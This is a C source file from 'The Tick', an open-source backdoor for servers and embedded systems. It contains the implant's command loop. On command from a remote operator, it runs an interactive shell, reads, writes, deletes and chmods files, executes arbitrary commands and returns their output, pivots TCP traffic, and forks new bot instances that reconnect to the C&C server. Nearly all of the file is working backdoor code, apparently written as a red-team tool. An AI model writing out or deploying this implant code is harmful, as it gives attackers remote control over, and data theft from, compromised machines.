/*
 * The Tick, a simple backdoor for servers and embedded systems.
 * 
 * Developed by Mario Vilas, mvilas@gmail.com
 * http://www.github.com/MarioVilas/thetick
 * 
 * Originally released as open source by NCC Group Plc - http://www.nccgroup.com/
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#include <string.h>
#include <unistd.h>
#include <stdio.h>

#include "common.h"
#include "tcp.h"
#include "parser.h"

#include "file.h"
#include "shell.h"
#include "dns.h"
#include "pivot.h"

#include "command.h"

// Main command loop.
int command_loop(Parser *p)
{
    while (1) {

        // Wait for the next command and read the command block header.
        // This call will block and reconnect if needed.
        parser_wait(p);

        // Now depending on the command ID we will do a number of things.
        switch (p->header.cmd_id)
        {

        // Just a simple no operation command. Useful for testing.
        case CMD_NOP:
            parser_ok(p);
            break;

        // Kill command. Just kill the current process.
        // Global cleanup will be handled by the atexit routine.
        case CMD_SYSTEM_EXIT:
            LOG("User requested termination.\n");
            parser_ok(p);
            parser_close(p);
            return 1;

        // Fork the bot. This will create a new bot instance with a new UUID.
        case CMD_SYSTEM_FORK:
            do_system_fork(p);
            break;

#ifndef TICK_FEATURES_NO_SHELL

        // Run an interactive shell.
        // This command reuses the C&C connection.
        case CMD_SYSTEM_SHELL:
            do_system_shell(p);
            LOG("Channel reused, reconnecting...\n");
            return 0;

#endif
#ifndef TICK_FEATURES_NO_FILE

        // Grab a file from the target machine.
        case CMD_FILE_READ:
            do_file_read(p);
            break;

        // Put a file into the target machine.
        case CMD_FILE_WRITE:
            do_file_write(p);
            break;

        // Delete a file in the target machine.
        case CMD_FILE_DELETE:
            do_file_delete(p);
            break;

        // Chmod a file in the target machine.
        case CMD_FILE_CHMOD:
            do_file_chmod(p);
            break;

#endif
#ifndef TICK_FEATURES_NO_EXEC

        // Run a non-interactive command and return the response.
        case CMD_FILE_EXEC:
            do_file_exec(p);
            break;

#endif
#ifndef TICK_FEATURES_NO_DNS

        // Domain name resolution.
        case CMD_DNS_RESOLVE:
            do_dns_resolve(p);
            break;

#endif
#ifndef TICK_FEATURES_NO_PIVOT

        // Simple TCP pivot.
        // This command reuses the C&C connection.
        case CMD_TCP_PIVOT:
            do_tcp_pivot(p);
            LOG("Channel reused, reconnecting...\n");
            return 0;

#endif

        // Unsupported command.
        default:
            LOG("Unsupported command: 0x%4x 0x%04x 0x%08x\n", p->header.cmd_id, p->header.cmd_len, p->header.data_len);
            parser_error(p, "not supported");
            break;
        }

        // Skip any unread bytes from the socket until we reach the next command.
        parser_next(p);
    }
}

// Implements the "fork" command.
// Also used internally by other commands.
void do_system_fork(Parser *p)
{

#ifdef _WIN32

    // While there is a curious fork() hack on Windows, I can't seem to get it working well.
    // The processes are forking alright but they can't seem to use sockets afterwards.
    // There are also some oddities in task manager... this could be useful later! >:)
    //
    // Instead, let's just launch a new process, since for this call it's all the same,
    // The downside is we cannot pass the new UUID back to the caller. :(
    // On the console it will show up just like any other new connection.

    char arguments[1024];
    char name[MAX_PATH];
    char port[32];
    memset(arguments, 0, sizeof(arguments));
    memset(name, 0, sizeof(name));
    memset(port, 0, sizeof(port));
    GetModuleFileNameA(NULL, name, MAX_PATH);
    itoa(p->port, port, 10);
    strcpy(arguments, name);
    strncat(arguments, " ", sizeof(arguments)-1);
    strncat(arguments, p->hostname, sizeof(arguments)-1);
    strncat(arguments, " ", sizeof(arguments)-1);
    strncat(arguments, port, sizeof(arguments)-1);
    strncat(arguments, " ", sizeof(arguments)-1);
    LOG("Launching new instance of bot. Command line: %s\n", arguments);
    if (arguments[strlen(arguments)-1] != ' ') {
        parser_error(p, "internal error");
        return;
    }
    PROCESS_INFORMATION pi;
    STARTUPINFO si;
    memset(&pi, 0, sizeof(pi));
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(STARTUPINFO);
    if (CreateProcessA(name, arguments, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi) != 0) {
        parser_ok(p);
    } else {
        parser_error(p, "internal error");
    }

#else

    // Generate a new UUID for the new instance.
    unsigned char uuid[16];
    uuid4(uuid);

    // Send the new UUID back to the caller.
    parser_begin_response(p, CMD_STATUS_OK, sizeof(uuid));
#ifdef TICK_FEATURES_NO_CRYPTO
    send_block(p->fd, (char *) uuid, sizeof(uuid));
#else
    if (p->use_ssl) {
        ssl_send_block(&p->ssl, (char *) uuid, sizeof(uuid));
    } else {
        send_block(p->fd, (char *) uuid, sizeof(uuid));
    }
#endif

    // Fork the new instance.
    if (fork() == 0) {

        // We are in the child instance now.
        // Set the new UUID into the Parser object.
        memcpy(p->uuid, uuid, sizeof(uuid));

        // Close the socket object and reconnect.
        // Do not shutdown! The parent process still uses this connection.
        close(p->fd);
        p->fd = -1;
        parser_close(p);
        parser_connect(p);
    }

#endif

}

#ifndef TICK_FEATURES_NO_EXEC

// These two functions "should" be in shell.c and file.c respectively.
// But if we do that, we bloat the binary if we only want to exec but not
// do file operations or run an interactive shell.

// Helper function to run a simple command.
int run_simple_command(const char *command, char *buffer, const size_t count)
{
    int success = 0;
    size_t read = 0;
    FILE* file = popen(command, "r");
    if (file != NULL) {
        while (count > read + 1) {
            if (fgets(buffer + read, count - read, file) == NULL) break;
            read = strlen(buffer);
        }
        buffer[read] = 0;
        if (pclose(file) != -1) {
            success = 1;
        }
    }
    return success;
}

// Implements the "exec" command.
void do_file_exec(Parser *p)
{
    char *command = (char *) &p->buffer;
    uint16_t buffer_length = 0;
    char buffer[TICK_EXEC_BUFFER_SIZE];

    // Get the filename (first argument).
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "command line too long");
        return;
    }

    // Execute the command.
    LOG("Executing: %s\n", command);
    if (run_simple_command(command, (char *) buffer, sizeof(buffer))) {
        LOG("Success\n");
        buffer_length = strlen(buffer);
        parser_begin_response(p, CMD_STATUS_OK, buffer_length);
#ifdef TICK_FEATURES_NO_CRYPTO
        send_block(p->fd, buffer, buffer_length);
#else
        if (p->use_ssl) {
            ssl_send_block(&p->ssl, buffer, buffer_length);
        } else {
            send_block(p->fd, buffer, buffer_length);
        }
#endif
    } else {
        LOG("Error\n");
        parser_error(p, "could not execute");
    }
}

#endif
